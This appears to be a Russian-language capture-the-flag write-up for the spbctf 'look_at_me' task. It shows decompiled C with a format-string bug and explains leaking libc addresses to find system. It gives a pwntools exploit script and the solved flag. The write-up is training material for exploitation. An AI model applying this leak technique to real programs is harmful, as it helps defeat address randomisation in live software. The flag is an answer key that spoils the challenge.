[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn3_look_at_me)
Описание:
Куда смотреть-то? Стеки, адреса, библиотеки, слоооожна...
`nc 109.233.56.90 11631`
**[look_at_me.elf](https://pwn.spbctf.ru/files/aslr/look_at_me/look_at_me.elf)**

Программа позволяет получить 21 адрес стека. Необходимо получить найти адрес функции system. Для этого надо ликнуть адресе переменных v5, v6, v7, чтобы при помощи них найти в базе данных нужную мне версию libc, а затем и ссылку на функцию system.
``` C
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  char nptr[32];
  int (**v4)(const char *);
  __int64 (**v5)(const char *, char **, int);
  char *(**v6)(char *, int, FILE *);
  int (**v7)(const char *, ...);

  v7 = &printf;
  v6 = &fgets;
  v5 = &strtol;
  v4 = nullptr;
  puts("Let's learn how to use https://libc.blukat.me/");
  puts("Leak some addresses from the stack and find out a libc version.");
  printf("Payload: ");
  safe_fgets(buf, 64, stdin);

  filter(buf);
  puts("Hmmm...");
  printf(buf);
  putchar(10);

  puts("And now enter address of `system` function.");
  printf("Address (as hex): ");
  safe_fgets(nptr, 32, stdin);
  v4 = strtol(nptr, nullptr, 16);
  if ( v4 == &system )
    print_flag();
  else
  {
    puts("Nope");
    exit(0);
  }
}

size_t __fastcall filter(const char *a1)
{
  size_t result;
  int i;

  for ( i = 0; ; ++i )
  {
    result = strlen(a1);
    if ( i >= result )
      break;
    if ( a1[i] != '%' && a1[i] != 'p' && a1[i] != '.' )
    {
      puts("No no no no! Too complicated for me...");
      exit(1);
    }
  }
  return result;
}
```

Дамп стека:
![{5A203199-B123-47AA-8177-FD5776B02D86}](../../../../z.%20Images/{5A203199-B123-47AA-8177-FD5776B02D86}.png)

Эти адреса указывают на функции:
```
0x7e5212b55c20 - strtol
0x7e5212b8f7b0 - fgets
0x7e5212b6ee10 - printf
```
![Pasted image 20260326172414](../../../../z.%20Images/Pasted%20image%2020260326172414.png)
У всех этих версий адрес функции `system` один и тот же: `0x55410`.

Эксплоит:
``` python
system_offset = 0x55410
strtol_offset = 0x4bc20

io = start()

io.sendlineafter(b'Payload: ', b'%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p')
io.recvline()
stack = io.recvline().decode().split('.')

strtol = int(stack[10], 16)
libc_base = strtol - strtol_offset
system = libc_base + system_offset

payload = hex(system).encode()
io.sendlineafter(b'Address (as hex): ', payload)

io.interactive()
```

Запуск:
![{AE1D0A85-4152-424C-8C27-AE9249F9B8F6}](../../../../z.%20Images/{AE1D0A85-4152-424C-8C27-AE9249F9B8F6}.png)

Ответ: `spbctf{d0b04c24ee4afba735454e31f515205b}`